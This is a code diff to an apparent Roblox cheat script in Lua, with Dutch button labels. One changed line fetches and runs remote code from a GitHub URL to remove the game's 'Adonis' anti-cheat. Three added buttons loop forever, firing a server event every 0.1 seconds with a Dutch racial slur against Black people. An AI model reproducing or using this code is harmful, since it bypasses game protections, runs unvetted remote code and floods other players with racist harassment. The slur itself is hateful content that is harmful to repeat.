@@ -350,7 +350,7 @@ local KnopUnviverseel4 = Universeel:CreateButton({
     Name = "Anti Cheat Destroyer",
     Callback = function()
 
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/0XXXMAXXX0/adonis/refs/heads/main/check'), true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0XXXMAXXX0/adonisremover/refs/heads/main/source"))()
 wait(0.5)
 local LocalPlayer = game.Players.LocalPlayer
 local oldhmmi
@@ -805,5 +805,49 @@ local screenGui = Instance.new("ScreenGui")
 	player.PlayerGui.BlackScreen:Destroy()
     warn("Character or HumanoidRootPart nie gevonden!")
 end
+    end,
+})
+
+local FiveR = Window:CreateTab("FiveR", 0) -- Title, Image
+local FiverKnop1 = FiveR:CreateButton({
+    Name = "Twitter Spam",
+    Callback = function()
+    local args = {
+	"dikke zwarte negertjes en fix jullie anti cheat"
+}
+while true do 
+game:GetService("ReplicatedStorage"):WaitForChild("TwitterPost"):FireServer(unpack(args))
+    wait(0.1)
+end
+
+    end,
+})
+local FiverKnop1 = FiveR:CreateButton({
+    Name = "Noodknop Spam",
+    Callback = function()
+    local args = {
+	"dikke zwarte negertjes en fix jullie anti cheat"
+}
+while true do 
+game:GetService("ReplicatedStorage"):WaitForChild("TwitterPost"):FireServer(unpack(args))
+    wait(0.1)
+end
+
+    end,
+})
+
+local Leeuwarden = Window:CreateTab("Leeuwarden", 0) -- Title, Image
+
+local LeeuwardenKnop1 = Leeuwarden:CreateButton({
+    Name = "Soon",
+    Callback = function()
+    local args = {
+	"dikke zwarte negertjes en fix jullie anti cheat"
+}
+while true do 
+game:GetService("ReplicatedStorage"):WaitForChild("TwitterPost"):FireServer(unpack(args))
+    wait(0.1)
+end
+
     end,
 })
